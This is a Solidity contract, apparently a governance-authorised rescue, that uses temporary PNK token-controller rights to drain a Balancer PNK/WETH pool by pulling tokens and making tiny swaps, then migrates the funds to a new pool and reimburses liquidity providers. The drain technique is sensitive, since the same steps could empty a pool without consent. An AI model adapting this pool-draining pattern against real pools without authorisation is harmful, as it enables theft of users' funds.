pragma solidity 0.5.12;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract MiniMeToken is IERC20 {
    function changeController(address _governor) external;
}

contract WETH9 is IERC20 {}

contract KlerosLiquid {}

contract BPool is IERC20 {
    function getBalance(address token) external view returns (uint256);
    function getSwapFee() external view returns (uint256);
    function gulp(address token) external;
    function swapExactAmountIn(
        address tokenIn,
        uint256 tokenAmountIn,
        address tokenOut,
        uint256 minAmountOut,
        uint256 maxPrice
    ) external returns (uint256 tokenAmountOut, uint256 spotPriceAfter);
    function swapExactAmountOut(
        address tokenIn,
        uint256 maxAmountIn,
        address tokenOut,
        uint256 tokenAmountOut,
        uint256 maxPrice
    ) external returns (uint256 tokenAmountIn, uint256 spotPriceAfter);
    function joinPool(uint256 poolAmountOut, uint256[] calldata maxAmountsIn) external;
}

contract KlerosGovernor {}

/*
    Recover funds related to the BPT liquidity locked at 0xd14b5739f5ff646e8f9b6ccf661257cbdf6dd0c4ece8b371eabe397b9d05da6e

    WARNING: The liquidity in this pool will lose about 96% (pool's BPT balance / BPT total supply) of its value at the time of writing

    Only the controller of PNK (MiniMeToken) can transfer tokens at will.
        WETH is at 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
        PNK  is at 0x93ED3FBe21207Ec2E8f2d3c3de6e058Cb73Bc04d
        Its controller is KlerosLiquid at 0x988b3a538b618c7a603e1c11ab82cd16dbe28069
        The controller's governor is 0x334f12afb7d8740868be04719639616533075234 (EOA)

    Everything must happen in the same transaction to prevent front-running

    KlerosLiquid can only execute one arbitrary internal transaction (as the msg.sender)
        at a time (call rather than delegatecall)
    This implies that either:
     - KlerosLiquid's governor needs to be changed (temporarily) to the attacking contract, or
     - PNK's controller needs to be changed (temporarily) to the attacking contract
    Here we went for the second (simplest) solution

    Attack steps:
        1. Deploy BalancerPoolRecoverer
        2. Transfer PNK's controller rights to the deployed BalancerPoolRecoverer
        3. Execute BalancerPoolRecoverer.attack()
*/

contract BalancerPoolRecoverer {
    uint256 constant gasPerIteration = 92294;
    uint256 constant BONE = 10 ** 18; // Represents balancer's one (1) in fixed point arithmetic

    bool attackDone;
    uint256 public balanceBPT;
    uint256 newBalanceBPT;
    mapping(address => uint256) public lpBalance; // Recorded balance of a liquidity provider
    address[] lpList;

    KlerosGovernor governor;
    MiniMeToken pnkToken;
    WETH9 wethToken;
    BPool bpool;
    BPool newBpool;
    KlerosLiquid controller;
    address beneficiary;

    modifier onlyGovernor() {
        require(msg.sender == address(governor));
        _;
    }

    constructor(
        KlerosGovernor _governor,
        MiniMeToken _pnkToken,
        WETH9 _wethToken,
        BPool _bpool,
        BPool _newBpool,
        KlerosLiquid _controller,
        address _beneficiary
    ) public {
        governor = _governor;
        pnkToken = _pnkToken;
        wethToken = _wethToken;
        bpool = _bpool;
        newBpool = _newBpool;
        controller = _controller;
        beneficiary = _beneficiary;
    }

    function registerLP(address lp) external {
        require(!attackDone);
        require(lp != address(bpool)); // Blacklist

        if (bpool.balanceOf(lp) != 0 && lpBalance[lp] == 0) {
            lpBalance[lp] = 1; // Actual balance will be recorded in the recovery transaction (in the attack function)
            lpList.push(lp);
        }
    }

    function restoreLP(uint256 iterations) external {
        require(attackDone);

        uint256 actualIterations = lpList.length;
        if (actualIterations > iterations)
            actualIterations = iterations;

        address receiver;
        uint256 amount;
        for (uint256 i = 0; i < actualIterations; i++) {
            receiver = lpList[lpList.length - 1];
            lpList.pop();
            amount = newBalanceBPT * lpBalance[receiver] / balanceBPT;
            newBpool.transfer(receiver, amount);
        }

        // After every LP has been reimbursed, send remaining funds to Coopérative Kleros
        if (lpList.length == 0) {
            newBpool.transfer(beneficiary, newBpool.balanceOf(address(this)));
            wethToken.transfer(beneficiary, wethToken.balanceOf(address(this)));
            pnkToken.transfer(beneficiary, pnkToken.balanceOf(address(this)));
        }
    }

    // In case the attack cannot be executed
    function restoreController() public onlyGovernor {
        pnkToken.changeController(address(controller));
    }

    // Since the attack contract is PNK's controller, it has to allow transfers and approvals
    function onTransfer(address _from, address _to, uint256 _amount) public returns (bool) {
        return true;
    }
    function onApprove(address _owner, address _spender, uint256 _amount) public returns (bool) {
        return true;
    }

    function attack() external onlyGovernor {
        attackDone = true;

        /* QUERY POOL STATE */
        uint256 poolBalanceWETH = bpool.getBalance(address(wethToken));
        uint256 poolBalancePNK = pnkToken.balanceOf(address(bpool));
        uint256 balanceWETH = poolBalanceWETH;
        uint256 balancePNK = poolBalancePNK;
        uint256 swapFee = bpool.getSwapFee();

        /* RECORD CURRENT HOLDER */
        balanceBPT = bpool.totalSupply();
        for (uint256 i = 0; i < lpList.length; i++)
            lpBalance[lpList[i]] = bpool.balanceOf(lpList[i]);

        /* PULL PNK */
        pnkToken.transferFrom(address(bpool), address(this), poolBalancePNK - 2); // Need to be the controller
        bpool.gulp(address(pnkToken));
        pnkToken.approve(address(bpool), poolBalancePNK - 2);
        poolBalancePNK = 2;

        /* PULL WETH (A.K.A ARBITRATION) */
        uint256 nextAmountIn  = 1; // poolBalancePNK / 2
        uint256 nextAmountOut = calcOutGivenIn(
            poolBalancePNK, // tokenBalanceIn
            poolBalanceWETH, // tokenBalanceOut
            nextAmountIn, // tokenAmountIn
            swapFee // swapFee
        );

        // Repeat as long as recovering the next WETH would cost too much gas
        while (nextAmountOut > gasPerIteration * tx.gasprice) {
            poolBalanceWETH -= nextAmountOut;
            poolBalancePNK += nextAmountIn;

            bpool.swapExactAmountIn(
                address(pnkToken),  // tokenIn
                nextAmountIn,       // tokenAmountIn
                address(wethToken), // tokenOut
                0,                  // minAmountOut
                uint256(-1)         // maxPrice
            );

            nextAmountIn  = poolBalancePNK / 2;
            nextAmountOut = calcOutGivenIn(
                poolBalancePNK, // tokenBalanceIn
                poolBalanceWETH, // tokenBalanceOut
                nextAmountIn, // tokenAmountIn
                swapFee // swapFee
            );
        }

        balanceWETH -= poolBalanceWETH;

        // Recover swapped PNK
        pnkToken.transferFrom(address(bpool), address(this), pnkToken.balanceOf(address(bpool))); // Need to be the controller

        /* MIGRATE TO NEW BPOOL */
        pnkToken.approve(address(newBpool), balancePNK);
        wethToken.approve(address(newBpool), balanceWETH);

        uint256 newBpoolBalanceBPT = newBpool.totalSupply();
        uint256 newBpoolBalancePNK = newBpool.getBalance(address(pnkToken));
        uint256 newBpoolBalanceWETH = newBpool.getBalance(address(wethToken));

        // See README.md
        uint256 ratio;
        if (balancePNK * newBpoolBalanceWETH > balanceWETH * newBpoolBalancePNK)
            ratio = (BONE * balanceWETH - BONE / 2) / newBpoolBalanceWETH;
        else
            ratio = (BONE * balancePNK - BONE / 2) / newBpoolBalancePNK;
        newBalanceBPT = (ratio * newBpoolBalanceBPT - newBpoolBalanceBPT / 2) / BONE;

        uint256[] memory maxAmountsIn = new uint256[](2);
        maxAmountsIn[0] = uint256(-1);
        maxAmountsIn[1] = uint256(-1);
        newBpool.joinPool(newBalanceBPT, maxAmountsIn);

        /* RESTORE CONTROLLER */
        restoreController();
    }

    // Code taken and adapted from https://github.com/balancer-labs/balancer-core
    function calcOutGivenIn(
        uint256 tokenBalanceIn,
        uint256 tokenBalanceOut,
        uint256 tokenAmountIn,
        uint256 swapFee
    )
        internal pure returns (uint256)
    {
        uint256 adjustedIn = bmul(tokenAmountIn, BONE - swapFee);
        uint256 y = bdiv(tokenBalanceIn, tokenBalanceIn + adjustedIn);
        uint256 bar = BONE - y;
        return bmul(tokenBalanceOut, bar);
    }

    function bmul(uint256 a, uint256 b)
        internal pure returns (uint256)
    {
        uint256 c0 = a * b;
        uint256 c1 = c0 + (BONE / 2);
        return c1 / BONE;
    }

    function bdiv(uint256 a, uint256 b)
        internal pure returns (uint256)
    {
        uint256 c0 = a * BONE;
        uint256 c1 = c0 + (b / 2);
        return c1 / b;
    }
}
